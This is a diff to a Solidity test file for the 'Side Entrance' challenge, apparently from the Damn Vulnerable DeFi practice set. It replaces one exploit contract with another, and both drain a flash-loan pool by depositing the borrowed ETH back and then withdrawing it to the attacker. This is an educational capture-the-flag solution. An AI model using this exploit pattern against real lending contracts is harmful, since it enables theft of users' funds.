@@ -8,38 +8,6 @@ import "../../src/side-entrance/SideEntranceLenderPool.sol";
 
 import "openzeppelin-contracts/utils/Address.sol";
 
-contract Executor is IFlashLoanEtherReceiver {
-    using Address for address payable;
-
-    SideEntranceLenderPool pool;
-    address owner;
-
-    constructor(SideEntranceLenderPool _pool) {
-        owner = msg.sender;
-        pool = _pool;
-    }
-
-    function execute() external payable {
-        require(msg.sender == address(pool), "only pool");
-        // receive flash loan and call pool.deposit depositing the loaned amount
-        pool.deposit{value: msg.value}();
-    }
-
-    function borrow() external {
-        require(msg.sender == owner, "only owner");
-        uint256 poolBalance = address(pool).balance;
-        pool.flashLoan(poolBalance);
-
-        // we have deposited inside the `execute` method so we withdraw the deposited borrow
-        pool.withdraw();
-
-        // now we transfer received pool balance to the owner (attacker)
-        payable(owner).sendValue(address(this).balance);
-    }
-
-    receive() external payable {}
-}
-
 contract SideEntranceLenderPoolTest is BaseTest {
     // Pool has 1000000 ETH in balance
     uint ETHER_IN_POOL = 1000 ether;
@@ -79,10 +47,8 @@ contract SideEntranceLenderPoolTest is BaseTest {
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
 
-        vm.startPrank(attacker);
-        Executor executor = new Executor(pool);
-        executor.borrow();
-        vm.stopPrank();
+        Hack hack = new Hack(address(pool), attacker);
+        hack.attack(address(pool).balance);
     }
 
     function success() internal override {
@@ -95,4 +61,30 @@ contract SideEntranceLenderPoolTest is BaseTest {
         // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract Hack is IFlashLoanEtherReceiver {
+    address public target;
+    address public attacker;
+
+    constructor(address _target, address _attacker) {
+        target = _target;
+        attacker = _attacker;
+    }
+
+    function execute() external payable {
+        (bool depositSuccess, ) = target.call{value: msg.value}(
+            abi.encodeWithSignature("deposit()")
+        );
+        require(depositSuccess, "deposit failed");
+    }
+
+    function attack(uint256 amount) public {
+        SideEntranceLenderPool pool = SideEntranceLenderPool(target);
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(attacker).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
 }
